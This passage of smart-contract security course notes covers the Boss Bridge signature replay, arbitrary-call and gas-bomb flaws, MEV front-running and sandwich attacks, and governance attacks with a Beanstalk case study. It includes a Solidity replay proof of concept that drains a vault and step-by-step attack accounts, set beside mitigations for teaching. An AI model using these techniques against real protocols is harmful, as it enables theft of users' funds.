+```
+
+> **Remember:** We're using MessageHashUtils here to format our message data to the EIP standard!
+
+When our operator signs a legitimate withdraw message, their signature components (v, r, and s) are available on-chain as a product of the functions being called in Boss Bridge. This means our attacker can use these values to execute the transaction over and over again maliciously.
+
+```solidity
+while (token.balanceOf(address(vault)) > 0) {
+  tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
+}
+​
+assertEq(
+  token.balanceOf(attacker),
+  attackerInitialBalance + vaultInitialBalance
+);
+assertEq(token.balanceOf(address(vault)), 0);
+```
+
+Ok, let's run it and see how Boss Bridge responds to our signature replay attack.
+
+```bash
+forge test --mt testSignatureReplay --vvv
+```
+
+![signature-replay-poc1](SC-Security-note.assets/signature-replay-poc1.png)
+
+Our test for signature replay passed. For such a small code base, we're sure finding a lot of highs...
+
+### Sig Replay Prevention
+
+We've learnt the ins and outs of how a signature replay attack is executed and what makes a protocol vulnerable to this exploit, but..
+
+***How do you protect against something like this?\***
+
+The simplest way to protect against a replay attack is to assure that the function being called includes some kind of mechanism such that it can only be called once. Common solutions include - adding a block nonce, or a deadline parameter which will cause any subsequent transaction calls to revert.
+
+```solidity
+function sendToL1(uint8 v, bytes32 r, bytes32 s, bytes memory message, uint256 deadline){...}
+```
+
+There are a variety of things you could employ, but the root of the solution is the same:
+
+Utilize some form of one-time-use data within your function to prevent it from being replayed!
+
+## Exploit: Low Level Call to Itself
+
+### Following up with Slither
+
+Earlier in the review, we came across an issue detected by Slither in `L1BossBridge.sol`. Let's head back there and verify what's going on.
+
+```solidity
+function sendToL1(uint8 v, bytes32 r, bytes32 s, bytes memory message) public nonReentrant whenNotPaused {
+    address signer = ECDSA.recover(MessageHashUtils.toEthSignedMessageHash(keccak256(message)), v, r, s);
+​
+    if (!signers[signer]) {
+        revert L1BossBridge__Unauthorized();
+    }
+​
+    (address target, uint256 value, bytes memory data) = abi.decode(message, (address, uint256, bytes));
+​
+    // @Audit-Question: Slither detects an issue here, follow up
+    (bool success,) = target.call{ value: value }(data);
+    if (!success) {
+        revert L1BossBridge__CallFailed();
+    }
+}
+```
+
+At the time, we didn't have enough context to know if this was actually bad or not. Slither detects this as a circumstance of [**`arbitrary-send-eth`**](https://github.com/crytic/slither/wiki/Detector-Documentation#functions-that-send-ether-to-arbitrary-destinations).
+
+***What's this mean?\***
+
+The issue is that the `sendToL1` function is passing arbitrary `messages`. We're taking the user's word that they are sending the correct message data, calling an expected function, but this may not be the case!
+
+Remember the `L1Vault` has a function `approveTo`, which can only be called by the `L1BossBridge`.
+
+```solidity
+function approveTo(address target, uint256 amount) external onlyOwner {
+    token.approve(target, amount);
+}
+```
+
+Were a malicious actor to pass *this* function data to the `sendToL1` message parameter, they could steal all the tokens in the vault!
+
+## Exploit: Gas Bomb
+
+### Exploit - Gas Bomb
+
+One more to go! This issues is actually *also* found within `sendToL1` (this function is a mess).
+
+So, what is a `gas bomb`?
+
+In essence it's a circumstance where an unexpectedly large amount of gas is suddenly required to execute the function of a protocol.
+
+In `Boss Bridge`, we see this as a product of taking arbitrary message data *again*.
+
+```solidity
+function sendToL1(uint8 v, bytes32 r, bytes32 s, bytes memory message) public nonReentrant whenNotPaused {...}
+```
+
+Solidity and the EVM have a hard time estimating the gas costs of a situation like this. In the past, malicious actors have sent message data which cost ***insane\*** amounts of gas to execute, costing the caller a tonne of money, or in some cases bricking a protocol.
+
+Some people just want to watch the world burn.
 
 
 
 # MEV & Governance
+
+## MEV: Introduction
+
+### What is MEV?
+
+Mev stands for "Maximum Extractable Value", or sometimes "Miner Extractable Value", and it's the value that blockchain node operators and users can extract by ordering transactions in a block in a specific order.
+
+In order to develop an in-depth understanding, I would highly recommend visiting [Flashbots.net](https://www.flashbots.net/), a research and development organization dedicated to counteracting the negative implications of MEV. Their '[**New to MEV**](https://docs.flashbots.net/new-to-mev)' page of their docs, in particular, is a fantastic learning resource. I highly *highly* recommend reading through these articles to understand what's going on with MEVs.
+
+### What is the mempool?
+
+![regular transaction](SC-Security-note.assets/regular-transaction.png)
+
+When a transaction is initiated it uses an RPC_URL, as we know. This URL points to a specific node on the blockchain which, instead of immediately integrating it into its block, places it into its 'memory pool', or 'mempool'. This constitutes the lower tier of workings that enable blockchain.
+
+![mempool](SC-Security-note.assets/mempool.png)
+
+As we know, nodes essentially "take turns" building blocks for the blockchain. So if you send your transaction to a single node, the node will have to wait until it's that node's turn to include your transaction! This could take months!
+
+So what the node does is accept your transaction, and add it to the `mempool`, accessible to other nodes. When another node sees this transaction waiting to be sent, it will pull transactions from the `mempool` to include in the block, often based on gas paid for that transaction.
+
+> **Remember:** Part of gas paid serves as a financial incentive for node operators!
+
+So this "`mempool`" is like a waiting room for transactions.
+
+### Front-running
+
+Suppose a malicious actor has visibility into the `mempool` and wants to use this to their advantage. Visibility into the `mempool` allows someone to effectively predict future transactions.
+
+If a malicious actor were to see a transaction in this waiting room that would benefit them, they're able to send *their own* transaction, paying more gas, skipping the line.
+
+The malicious actor's transaction would execute before the victims!
+
+![image-20250926233051181](SC-Security-note.assets/image-20250926233051181.png)
+
+This is called Front-Running and is one of the most common forms of MEV. Let's look at a more minimal diagram in the next lesson before moving on.
+
+## MEV - Minimized
+
+We can take a look at this image to see a minimized visual representation of what MEV looks like. In specific, this kind of MEV is known as "front-running".
+
+![regular transaction](SC-Security-note.assets/minimized.png)
+
+### MEV - Everywhere
+
+To demonstrate just how pervasive this vulnerability is in Web3 .. I've got a secret.
+
+***EVERY\*** code base we've audited up to now has been susceptible to MEV attacks! Let's go over how it applies in each situation, starting with Puppy Raffle!
+
+
+
+## MEV: Puppy Raffle
+
+### Front Running in Puppy Raffle
+
+Let's look at how Puppy Raffle was vulnerable to front running. Our Puppy Raffle's core function is `selectWinner`.
+
+```solidity
+function selectWinner() external {
+    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
+    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
+    uint256 winnerIndex =
+        uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
+    address winner = players[winnerIndex];
+    uint256 totalAmountCollected = players.length * entranceFee;
+    uint256 prizePool = (totalAmountCollected * 80) / 100;
+    uint256 fee = (totalAmountCollected * 20) / 100;
+    totalFees = totalFees + uint64(fee);
+​
+    uint256 tokenId = totalSupply();
+​
+    // We use a different RNG calculate from the winnerIndex to determine rarity
+    uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
+    if (rarity <= COMMON_RARITY) {
+        tokenIdToRarity[tokenId] = COMMON_RARITY;
+    } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
+        tokenIdToRarity[tokenId] = RARE_RARITY;
+    } else {
+        tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
+    }
+​
+    delete players;
+    raffleStartTime = block.timestamp;
+    previousWinner = winner;
+    (bool success,) = winner.call{value: prizePool}("");
+    require(success, "PuppyRaffle: Failed to send prize pool to winner");
+    _safeMint(winner, tokenId);
+}
+```
+
+Effectively, when the `selectWinner` function is called, the transaction is then sent to the MemPool. At this point anyone can see the results of the selectWinner function. If a user participating in the raffle identifies that they didn't win, the potential exists for them to refund their entry fee!
+
+A user does this by recognizing that they lost, and then paying more gas to have their refund request processed before the `selectWinner` transaction.
+
+This will lower the prize of the winner!
+
+![mev-in-puppy-raffle1](SC-Security-note.assets/mev-in-puppy-raffle1.png)
+
+## MEV: TSwap
+
+Ok, so Puppy Raffle wasn't safe - what about TSwap, was there a problem there?
+
+Absolutely! Recall from TSwapPool.sol, the deposit function:
+
+```solidity
+function deposit(
+    uint256 wethToDeposit,
+    uint256 minimumLiquidityTokensToMint,
+    uint256 maximumPoolTokensToDeposit,
+    uint64 deadline
+)
+    external
+    revertIfZero(wethToDeposit)
+    returns (uint256 liquidityTokensToMint)
+{
+    if (wethToDeposit < MINIMUM_WETH_LIQUIDITY) {
+        revert TSwapPool__WethDepositAmountTooLow(
+            MINIMUM_WETH_LIQUIDITY,
+            wethToDeposit
+        );
+    }
+    if (totalLiquidityTokenSupply() > 0) {
+        uint256 wethReserves = i_wethToken.balanceOf(address(this));
+        uint256 poolTokenReserves = i_poolToken.balanceOf(address(this));
+        // Our invariant says weth, poolTokens, and liquidity tokens must always have the same ratio after the
+        // initial deposit
+        // poolTokens / constant(k) = weth
+        // weth / constant(k) = liquidityTokens
+        // aka...
+        // weth / poolTokens = constant(k)
+        // To make sure this holds, we can make sure the new balance will match the old balance
+        // (wethReserves + wethToDeposit) / (poolTokenReserves + poolTokensToDeposit) = constant(k)
+        // (wethReserves + wethToDeposit) / (poolTokenReserves + poolTokensToDeposit) =
+        // (wethReserves / poolTokenReserves)
+        //
+        // So we can do some elementary math now to figure out poolTokensToDeposit...
+        // (wethReserves + wethToDeposit) = (poolTokenReserves + poolTokensToDeposit) * (wethReserves / poolTokenReserves)
+        // wethReserves + wethToDeposit  = poolTokenReserves * (wethReserves / poolTokenReserves) + poolTokensToDeposit * (wethReserves / poolTokenReserves)
+        // wethReserves + wethToDeposit = wethReserves + poolTokensToDeposit * (wethReserves / poolTokenReserves)
+        // wethToDeposit / (wethReserves / poolTokenReserves) = poolTokensToDeposit
+        // (wethToDeposit * poolTokenReserves) / wethReserves = poolTokensToDeposit
+        uint256 poolTokensToDeposit = getPoolTokensToDepositBasedOnWeth(
+            wethToDeposit
+        );
+        if (maximumPoolTokensToDeposit < poolTokensToDeposit) {
+            revert TSwapPool__MaxPoolTokenDepositTooHigh(
+                maximumPoolTokensToDeposit,
+                poolTokensToDeposit
+            );
+        }
+​
+        // We do the same thing for liquidity tokens. Similar math.
+        liquidityTokensToMint =
+            (wethToDeposit * totalLiquidityTokenSupply()) /
+            wethReserves;
+        if (liquidityTokensToMint < minimumLiquidityTokensToMint) {
+            revert TSwapPool__MinLiquidityTokensToMintTooLow(
+                minimumLiquidityTokensToMint,
+                liquidityTokensToMint
+            );
+        }
+        _addLiquidityMintAndTransfer(
+            wethToDeposit,
+            poolTokensToDeposit,
+            liquidityTokensToMint
+        );
+    } else {
+        // This will be the "initial" funding of the protocol. We are starting from blank here!
+        // We just have them send the tokens in, and we mint liquidity tokens based on the weth
+        _addLiquidityMintAndTransfer(
+            wethToDeposit,
+            maximumPoolTokensToDeposit,
+            wethToDeposit
+        );
+        liquidityTokensToMint = wethToDeposit;
+    }
+}
+```
+
+We identified, during our review, that the `deadline` parameter wasn't being used. How would that potentially lead to an `MEV` attack in `TSwap`?
+
+Before a transaction is sent to the `MemPool`, it is sent to a node. Node operators have privileged information with respect to transactions about to be added to the blockchain and in some circumstances they can delay when a transaction is processed by up to a whole block. If the `deadline` parameter was properly employed it could have prevented this!
+
+Imagine a node operator happened to be a `liquidity provider` in `TSwap`. This operator would be able to see pending deposits into the protocol, the practical effect of which would be that their shares and fees are lowered as the `LPTokens` are diluted.
+
+This malicious node operator would have the power to delay the processing of this `deposit` transaction in favor of validating more swap transactions maximizing the fees they would obtain from the protocol at the expensive of the new depositor!
+
+![mev-in-tswap1](SC-Security-note.assets/mev-in-tswap1.png)
+
+
+
+## MEV: ThunderLoan
+
+Surely Thunder Loan is safe from MEV attacks! Everything happens so fast, there's no way someone could step in to affect anything, right?
+
+Afraid not.
+
+`Thunder Loan` is susceptible to something called a `sandwich attack`.
+
+By closely monitoring the `mempool`, a malicious actor would be able to see a pending flash loan and exploit `Thunder Loan`'s reliance on the TSwap protocol as an oracle by swapping the loaned tokens, `front running` the flash loan, and subsequently altering the expected fees associated with it.
+
+The malicious actor can then **swap back** (this is called `back running`) before the loan's repayment checks TSwap again! This would drastically impact the flash loan experience in Thunder Loan and may cause several of them to fail, or worse - cost victims a tonne in unexpected fees.
+
+![thunder-loan](SC-Security-note.assets/image_13_pc0gbk.png)
+
+## MEV: BossBridge
+
+Now you're starting to see the picture, and the Boss Bridge MEV becomes clear.
+
+![boss bridge mev](SC-Security-note.assets/mev-boss-bridge1.png)
+
+Similarly to the Signature Replay attack, a malicious actor could see a signer's call to sendToL1 pending in the MemPool. With access to the signature sent in the transaction, it can be front run, causing the sendToL1 transaction to happen unexpectedly, or multiple times.
+
+Without specifying some sort of protection against this (leveraging a nonce, requiring the signer to call it first etc), Boss Bridge is wide open to these kinds of vulnerabilities.
+
+## MEV: LIVE
+
+### MEV - LIVE
+
+> ❗ **IMPORTANT**
+> The true value in this (and the following lesson) is found in seeing this exploit in action. If you're unable to watch this currently, I encourage you to return when you can!
+
+Here is [the code we are going to use to see it](https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/MEV/Frontran.sol)
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.20;
+​
+contract FrontRan {
+    error BadWithdraw();
+​
+    bytes32 public s_secretHash;
+​
+    event success();
+    event fail();
+​
+    constructor(bytes32 secretHash) payable {
+        s_secretHash = secretHash;
+    }
+​
+    function withdraw(string memory password) external payable {
+        if (keccak256(abi.encodePacked(password)) == s_secretHash) {
+            (bool sent,) = msg.sender.call{value: address(this).balance}("");
+            if (!sent) {
+                revert BadWithdraw();
+            }
+            emit success();
+        } else {
+            emit fail();
+        }
+    }
+​
+    function balance() external view returns (uint256) {
+        return address(this).balance;
+    }
+}
+```
+
+Watch the video to see:
+
+1. Me get front-ran
+2. How we prevent it with [Flashbots Protect](https://docs.flashbots.net/flashbots-protect/overview)
+
+Use Flashbots protected private rpc-url!!!!! It don't share mem-pool.
+
+## MEV: Live AGAIN
+
+### MEV - Live AGAIN!
+
+> ❗ **IMPORTANT**
+> The true value in this (and the prior lesson) is found in seeing this exploit in action. If you're unable to watch this currently, I encourage you to return when you can!
+
+So, a lot of people saw me do this and started to theorize.
+
+- "Hey, could we obfuscate the transaction?"
+- "What if there was another contract in the way?"
+- "What if it was written in assembly?"
+
+And I'm here to tell you, it doesn't matter. The bots simulate the transaction, and pick out the parts they can use to make money.
+
+We look at a [modified example](https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/MEV/Bouncer.sol) where we add a "bouncer" contract to try to "block" the transactions.
+
+![bouncer](SC-Security-note.assets/bouncer.png)
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.20;
+​
+interface IFrontRan {
+    function withdraw(string memory password) external;
+}
+​
+contract Bouncer {
+    error Bouncer__NotOwner();
+    error Bouncer__DidntMoney();
+​
+    address s_owner;
+    address s_frontRan;
+​
+    constructor(address frontRan) payable {
+        s_owner = msg.sender;
+        s_frontRan = frontRan;
+    }
+​
+    function go(string memory password) external {
+        if (msg.sender != s_owner) {
+            revert Bouncer__NotOwner();
+        }
+        IFrontRan(s_frontRan).withdraw(password);
+        (bool success,) = payable(s_owner).call{value: address(this).balance}("");
+        if (!success) {
+            revert Bouncer__DidntMoney();
+        }
+    }
+​
+    receive() external payable {}
+}
+```
+
+So, watch the video above to see, will this contract help block the MEV bots?
+
+NO!!!!!!!!
+
+## Case Study: Pashov
+
+To walk us through some real-world reports where MEV was reported, we have guest lecturer [Pashov](https://twitter.com/pashovkrum), legendary independent security researcher, joining us!
+
+### What is MEV?
+
+**MEV** - Maximum Extractable Value (Miner Extractable Value) - Both good and bad for the Ethereum Ecosystem, this concept exists in 4 forms
+
+1. **Arbitrage** - detailed in previous lessons, this process is often handled by MEV bots. A difference in price between exchanges will be identified and MEV bots will balance the pools and their prices by leveraging swaps between them (and profiting along the way)
+2. **Sandwiches** - we've covered this briefly earlier as well (remember Thunder Loan!), but we'll cover it with Pashov in more detail later
+3. **Liquidations** - In the context of borrowing and lending protocols, bad debt needs to be accounted for quickly. Users which have failed to repay loans or if borrowed funds become undercollateralized may be liquidated by MEV bots
+4. **JIT(Just In Time) Liquidity** - this is a type of attack or exploit where an MEV bot will identify a large transaction (borrow, swap etc) and will, just prior to this transaction, provide a bunch of liquidity to the protocol. This could have two effects:
+   1. drastically impact the value of tokens being swapped
+   2. rob other liquidity providers of fees, but swooping in then withdrawing their liquidity immediately after the transaction
+
+There are two incredible articles covering MEV in great detail available on galaxy.com.
+
+- [**MEV: Maximal Extractable Value Pt. 1**](https://www.galaxy.com/insights/research/mev-how-flashboys-became-flashbots/)
+- [**MEV: Maximal Extractable Value Pt. 2**](https://www.galaxy.com/insights/research/mev-the-rise-of-the-builders/)
+
+You're highly encouraged to read through these articles for more context and a deeper understanding!
+
+### Sandwich Attacks
+
+`Sandwich Attacks` represent a very specific style of attack vector. We'll go through a couple different example pulled from [**Solodit**](https://solodit.xyz/) to outline how they work.
+
+> ❗ **PROTIP**
+> Solodit is the industry leading aggregator of validated smart contract vulnerabilities and should absolutely be in every security researcher's toolbelt!
+
+`Sandwich Attacks` are similar in nature to `Just In Time (JIT)` liquidity exploits in that they both involve a `front run` and `back run` phase of the attack.
+
+![pashov](SC-Security-note.assets/case-study-pashov1.png)
+
+In the diagram above, the user ends up paying way more for their expected swap!
+
+A great example of a vulnerability like this, caught in the wild, was[** a submission in a 2023 Audit of the Derby code base**](https://solodit.xyz/issues/h-2-vault-executes-swaps-without-slippage-protection-sherlock-derby-derby-git). Let's go through this submission together to see what's happening.
+
+As described in the submission:
+
+```
+The vault executes swaps without slippage protection. That will cause a loss of funds because of sandwich attacks.
+```
+
+***So, what is slippage protection?\***
+
+`Slippage protection` is a methodology which gives the user the ability to set a tolerance in the change of price of tokens in a transaction.
+
+If a user is trading `2000 USDT for 1 ETH` (like in the diagram above), `slippage protection` would allow them to say *"I don't want to pay more than 2100 USDC for 1 ETH (5%), if the price changes by more than this, revert"*.
+
+tiA consideration like this allows users to control the impact MEV shenanigans will have on them.
+
+In the [**Derby example**](https://solodit.xyz/issues/h-2-vault-executes-swaps-without-slippage-protection-sherlock-derby-derby-git), it seems they *tried* to account for this, but the logic was incorrectly implemented. The submission details:
+
+```
+Both in Vault.claimTokens() and MainVault.withdrawRewards() swaps are executed through the Swaps library. It calculates the slippage parameters itself which doesn't work. Slippage calculations (min out) have to be calculated outside of the swap transaction. Otherwise, it uses the already modified pool values to calculate the min out value.
+```
+
+In this finding, Derby was attempting to account for `slippage protection`, but had erroneously added this calculation *within* the transaction being sent to the `MemPool`. This means, by the time a user's transaction has been executed, the calculated `slippage protection` will be based on an already modified liquidity pool!
+
+We can see this in the code, within the `swapTokensMulti` function:
+
+```solidity
+function swapTokensMulti(
+SwapInOut memory _swap,
+IController.UniswapParams memory _uniswap,
+bool _rewardSwap
+) public returns (uint256) {
+IERC20(_swap.tokenIn).safeIncreaseAllowance(_uniswap.router, _swap.amount);
+​
+uint256 amountOutMinimum = IQuoter(_uniswap.quoter).quoteExactInput(
+    abi.encodePacked(_swap.tokenIn, _uniswap.poolFee, WETH, _uniswap.poolFee, _swap.tokenOut),
+    _swap.amount
+);
+...
+}
+```
+
+The function quoteExactInput is being called *within* our swap transaction. As a result, the calculation here will be based on already modified values!
+
+### Gauntlet
+
+We see a similar example of this vulnerability through [**another submission**](https://solodit.xyz/issues/deposit-and-withdraw-functions-are-susceptible-to-sandwich-attacks-spearbit-gauntlet-pdf) on Solodit, this time pertaining to a review of the Gauntlet code base.
+
+The situation here is very similar to the previous example.
+
+```solidity
+Description: Transactions calling the deposit() function are susceptible to sandwich attacks where an attacker
+can extract value from deposits. A similar issue exists in the withdraw() function but the minimum check on the
+pool holdings limits the attack’s impact.
+Consider the following scenario (swap fees ignored for simplicity):
+​
+1. Suppose the Balancer pool contains two tokens, WETH and DAI, and weights are 0.5 and 0.5. Currently,
+there is 1 WETH and 3k DAI in the pool and WETH spot price is 3k.
+​
+2. The Treasury wants to add another 3k DAI into the Aera vault, so it calls the deposit() function.
+​
+3. The attacker front-runs the Treasury’s transaction. They swap 3k DAI into the Balancer pool and get out 0.5 WETH. The weights remain 0.5 and 0.5, but because WETH and DAI balances become 0.5 and 6k, WETH’s spot price now becomes 12k.
+​
+4. Now, the Treasury’s transaction adds 3k DAI into the Balancer pool and upgrades the weights to 0.5*1.5: 0.5 = 0.6: 0.4.
+​
+5. The attacker back-runs the transaction and swaps the 0.5 WETH they got in step 3 back to DAI (and recovers the WETH’s spot price to near but above 3k). According to the current weights, they can get 9k*(1 - 1/r) = 3.33k DAI from the pool, where r = (2ˆ0.4)ˆ(1/0.6).
+​
+​
+6. As a result the attacker profits 3.33k - 3k = 0.33k DAI.
+```
+
+In this instance, front running a `deposit` call allows an attacker to change the effective token ratio/price, resulting in an inflated value when the deposit function executes.
+
+The result of this is that the attacker is able to swap back, profiting due to this change in the token ratio.
+
+### Wrap Up
+
+I hope this lessons has put into perspective exactly how MEV attacks (like sandwich attacks) work and stressed the need for protections such as `slippage protection` ie a `minimumAmountReceived` parameter or the like.
+
+An alternative mitigation to MEV attack like we've seen is the leveraging of `Flashbots` and private MemPools. Let's go over what these are in more detail, in the next lesson.
+
+*Please, don't ever miss MEV Bugs.* - Pashov
+
+![image-20250927021111827](SC-Security-note.assets/image-20250927021111827.png)
+
+
+
+
+
+## MEV: Prevention
+
+Our first line of defense against MEV is to refine our designs. To illustrate this, let's revisit our [**Puppy Raffle repo**](https://github.com/Cyfrin/4-puppy-raffle-audit/blob/main/src/PuppyRaffle.sol). The issue was when `selectWinner` was called.
+
+
+
+How can we protect Puppy Raffle from MEV attacks? Well, we can do a couple things.
+
+A simple solution would be to introduce a function, like `endRaffle`, which signifies the completion of the raffle. Once a raffle is `ended` it will enter a new state, we then have functions like `refund` require that `Puppy Raffle` not be in that state.
+
+```solidity
+function endRaffle() internal {
+    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not closed.");
+    require(players.length >= 4, "PuppyRaffle: Need at least 4 players!");
+    isEnding = True;
+}
+​
+function selectWinner() external {
+    endRaffle();
+    ...
+}
+​
+function refund(uint256 playerIndex) public {
+​
+    if(isEnding){
+        revert();
+    }
+​
+    address playerAddress = players[playerIndex];
+    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+​
+    payable(msg.sender).sendValue(entranceFee);
+​
+    players[playerIndex] = address(0);
+    emit RaffleRefunded(playerAddress);
+}
+
+```
+
+With an adjustment like this, the moment `selectWinner` is called, the refund function will be locked, preventing an `MEV Bot` from seeing this transaction and dodging the raffle!
+
+There's no universal statement that covers all the possible situations in which `MEV` exploits can arise, but, as security researchers, we should always be asking:
+
+***If someone sees this transaction in the mempool, how can they abuse this knowledge?\***
+
+### Private or Dark Mempool
+
+Another thing we can consider for defense is the use of a private or "dark" `mempool`, such as [**Flashbots Protect**](https://docs.flashbots.net/flashbots-protect/overview), [**MEVBlocker**](https://mevblocker.io/) or [**Securerpc**](https://securerpc.com/).
+
+![image-20250927202746142](SC-Security-note.assets/image-20250927202746142.png)
+
+Instead of submitting your transaction to a `public mempool`, you can send your transaction to this `private mempool`. Unlike the `public mempool`, this keeps the transaction for itself until it's time to post it on the chain.
+
+Despite its pros, the `private mempool` requires you to trust that it will maintain your privacy and not front-run you itself. Another downside is the slower transaction speed. You may be waiting longer for your node to include your transaction in a block!
+
+If you're curious, you can observe this in action by adding an RPC from Flashbots Protect to your MetaMask.
+
+### Slippage Protection
+
+The final way we've covered to prevent MEV exploitation is to implement some form of slippage protection. This is usually in the form of some `minOutputAmount` function parameter as we saw in the TSwap Protocol.
+
+```solidity
+function swapExactInput(
+        IERC20 inputToken,
+        uint256 inputAmount,
+        IERC20 outputToken,
+        uint256 minOutputAmount,
+        uint64 deadline
+    ){...}
+```
+
+As we discussed previously, leveraging a parameter like this allows the user to set their tolerance of price change during their transaction, limiting their exposure to sudden price fluctuations by MEV Exploits!
+
+As security experts, we should always be advising protocols how they can defend their users against MEV. Let's recap everything we've been over, in the next lesson.
+
+
+
+## Governance Attack: Intro
+
+### Governance Attack - Introduction
+
+For this one, we're joined by [Juliette](https://twitter.com/_juliettech) for a walkthrough of governance attacks from a high level.
+
+The final boss Vault Guardians protocol is actually controlled by a DAO (Decentralized Autonomous Organization). This means we should be aware of potential vulnerabilities that may derive from governance in Web3.
+
+### What is a Governance Attack?
+
+`Governance attacks` are typically made through a governance proposal, generally with the intent of draining the protocol's liquidity.
+
+This is in contrast to many other exploits where the mechanism of attack is more directly related to cryptography, or bugs in the code.
+
+There are different types of Governance, such as:
+
+- **Token Voting** - 1 token == 1 vote
+- **allowlist** - 1 address == X votes
+- **multisig** - X addresses
+- **quadraticVoting** - # of people > # votes
+
+A `governance attack` is then malicious action that is taken which exploits or leverages one of these `governance mechanisms`.
+
+### How do Governance Attacks Work?
+
+At first glance the steps of a `governance attack` seem pretty silly.
+
+1. A malicious actor publishes a proposal which contains an action
+   - this action could be any number of things from changing allow list addresses, to transferring tokens, code base changes etc
+2. The Proposal is approved
+   - this can be achieved by acquiring more voting power than is needed to pass the proposal, social engineering, or obfuscating what the proposed change is actually doing
+3. The action is executed
+4. The attack completed/funds stolen
+
+You're encouraged to look into the cases of Yam Finance and Build.Finance for some eye opening examples of `governance attacks` in the wild.
+
+### How do we Prevent Governance Attacks?
+
+There are a few ways to mitigate the effects of governance attacks, but at their core, they're really a *`people's problem`*. Some ways to defend against these attacks may include:
+
+- **Centralization of Power** - while not ideal in a Web3 ecosystem, this *does* solve the issue of control being democratically wielded through `voting mechanisms`.
+- **Strategic Voting Power Distribution** - think carefully about who holds the most power over protocol `governance`, by strategic in assuring voting power is allotted to those invested and not made available to anyone with a flash loan
+- **Guardian Buffer** - while this also sacrifices a degree of decentrality, this is an entity which serves as a buffer to vet proposals for malicious actions and assure pursued proposals are financially viable for the organization. This protects against `governance attacks` by filtering malicious proposals before they reach the voting stage
+- **Gradual Decentralization** - Slowly opening up control allows a protocol to become better established in self management
+- **Emergency Plan** - Emergency functionality or operating procedures should be in place. Knowing how to deal with emergency situations before they happen is the difference between putting out a stove fire and your house burning down
+
+## Case Study - Beanstalk
+
+And now, we have guest lecturer and fellow course creator [JohnnyTime](https://twitter.com/RealJohnnyTime) to walk us through a real-world case study of a governance attack in action.
+
+You can read more about the [Bean attack in Rekt](https://rekt.news/beanstalk-rekt/). We'll outline some highlights of the attack here.
+
+### The Numbers and Highlights
+
+- $182,000,000 loss to the protocol
+- Attacker profited $76,000,000 which they laundered through Tornado Cash
+- $106,000,000 was paid in flash loan and swap feed on Aave and Uniswap respectively.
+- Governance Manipulation Attack
+- Highly Sophisticated
+
+### What is Beanstalk Protocol?
+
+Beanstalk is a decentralized credit system which leverages the BEAN stablecoin. This protocol creates incentives for trading which stabilize the peg.
+
+If BEAN is under the $1 peg, the protocol will decrease the supply, if it's above the $1 peg, the supply will increase.
+
+There are a few technical aspects of the Beanstalk Protocol which are of note.
+
+- Diamond Proxy Pattern - allows upgradeability through facets
+- Functionality can be added/removed
+- On-chain governance
+
+### How Does Beanstalk Work?
+
+You can find a very thorough breakdown of Beanstalk as a protocol via a video from The Calculator Guy, [**On YouTube**](https://www.youtube.com/watch?v=h2wlrnd5jSM). Encourage you to check him out.
+
+One thing not covered in depth in the video above is how the governance within Beanstalk actually works.
+
+The Beanstalk Protocol contains token based governance linked to its STALK token. STALK is earned through staking primarily within the protocol and it's through the possession of STALK that a user's voting power is gained.
+
+Proposals to the protocol are made via BIPs (Beanstalk Improvement Proposals)
+
+> ❗ **PROTIP**
+> Beanstalk had been audited several times before they were exploited! This goes to show you can never be *too* secure!
+
+### How Are BIPs Executed?
+
+A BIP which has been approved via vote has to wait 7 days, due to a timelock, before execution. This is a security measure to assure hasty code changes aren't implemented without thorough consideration.
+
+This flow is executed through the `commit(bip)` function.
+
+A second option exists in order to execute BIP through the `emergencyCommit(bip)` function which, as one would assume, expedites execution of a BIP, possessing only a 1 day timelock. The caveat is that, in order to call the `emergencyCommit` function a `super-majority` is required, this is defined as 67% of the voting power.
+
+### The Attack
+
+Prior to the exploit of Beanstalk, on-chain evidence shows that they funded their EOA wallet with nearly 100 ETH through Tornado Cash.
+
+**Step 1.** Purchase BEAN token from UNISWAP
+
+**Step 2.** Deposit BEAN into the Beanstalk Protocol. This affords the attacker governance power which allows them to submit BIPs
+
+**Step 3.** Create 2 Proposals
+
+- BIP18 - An unusually empty proposal
+- BIP19 - A proposal to donate $250,000 to Ukraine, with $10,000 being sent to the person who created the proposal
+  - Crucially, the name of the facet proposed to execute this donation was `initBip18`
+
+**Step 4.** Deploy Malicious Contract
+
+At this point, the attacker deployed a malicious smart contract, which did a number of things.
+
+1. Executed flash loans and flash swaps from 3 separate sources, `AAVE`, `Uniswap`, `SushiSwap`, totaling $1 Billion.
+2. Leverages all of this liquidity and deposits into the Beanstalk Protocol's staking system (this give the attacker a huge influx in voting power due to the awarding of STALK tokens).
+
+Once 70% of the voting power was obtained by the attacker, this power (representing a super-majority) was used to execute a second, **REAL**, malicious BIP18 contract. This malicious contract stole the liquidity from Beanstalk.
+
+1. Pays back the loans
+   - Once all the borrowed liquidity was paid back, the attacker was left with almost $79,000,000
+
+**Step 5.** Laundering The Money
+
+After converting the stolen funds to ETH, the attacker leverages the Tornado Cash mixer to obfuscate where the money is being sent in an effort to get away with his ill gotten gains.
+
+### The Fallout
+
+The effect of this attack was devastating to the protocol, and destroyed the value of the BEAN token. Since the attack, Beanstalk survived and has since recovered nicely. Ultimately they chose to remove on-chain governance to severe an attacker's ability to automatically influence the functionality of the protocol. Future proposals are checked and executed by the protocol team before execution!
